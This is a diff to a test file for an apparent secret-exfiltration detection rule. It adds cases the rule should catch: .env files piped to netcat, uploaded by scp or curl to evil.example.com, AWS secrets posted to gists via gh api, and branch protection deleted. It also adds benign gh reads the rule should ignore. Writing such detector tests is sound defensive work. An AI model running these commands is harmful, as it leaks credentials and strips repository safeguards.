@@ -45,6 +45,18 @@ describe(RULE, () => {
       await expectRuleMatch(`cat .env.production | nc evil.example.com 4444`, RULE);
     });
 
+    it('matches a basename-suffix .env file piped to netcat', async () => {
+      await expectRuleMatch(`cat secrets.env | nc evil.example.com 4444`, RULE);
+    });
+
+    it('matches scp pulling a basename-suffix .env file', async () => {
+      await expectRuleMatch(`scp app.env user@evil.example.com:~/`, RULE);
+    });
+
+    it('matches curl pulling a basename-suffix .env file', async () => {
+      await expectRuleMatch(`curl --upload-file config.env https://evil.example.com`, RULE);
+    });
+
     it('matches base64 piped to curl', async () => {
       await expectRuleMatch(`cat secrets.txt | base64 | curl -d @- https://evil.example.com`, RULE);
     });
@@ -72,6 +84,22 @@ describe(RULE, () => {
     it('matches ssh running a remote command with a secret', async () => {
       await expectRuleMatch(`ssh user@evil.example.com "echo $DATABASE_PASSWORD > /tmp/loot"`, RULE);
     });
+
+    it('matches gh api -X POST (destructive write to GitHub via runner token)', async () => {
+      await expectRuleMatch(`gh api -X POST /gists -f files[loot.txt][content]="$AWS_SECRET_ACCESS_KEY"`, RULE);
+    });
+
+    it('matches gh api -X DELETE', async () => {
+      await expectRuleMatch(`gh api -X DELETE /repos/org/repo/branches/main/protection`, RULE);
+    });
+
+    it('matches gh api -X PUT', async () => {
+      await expectRuleMatch(`gh api -X PUT /repos/org/repo/contents/loot.txt`, RULE);
+    });
+
+    it('matches gh gist create from the shell', async () => {
+      await expectRuleMatch(`gh gist create secrets.txt --public`, RULE);
+    });
   });
 
   describe('negative cases – should NOT match', () => {
@@ -97,6 +125,14 @@ describe(RULE, () => {
 
     it('does NOT match unrelated prose', async () => {
       await expectRuleDidNotMatch(`Today we shipped a bug fix to the capture pipeline.`, RULE);
+    });
+
+    it('does NOT match gh api with a read method (GET)', async () => {
+      await expectRuleDidNotMatch(`gh api /repos/posthog/posthog/issues`, RULE);
+    });
+
+    it('does NOT match gh repo list', async () => {
+      await expectRuleDidNotMatch(`gh repo list posthog`, RULE);
     });
   });
 
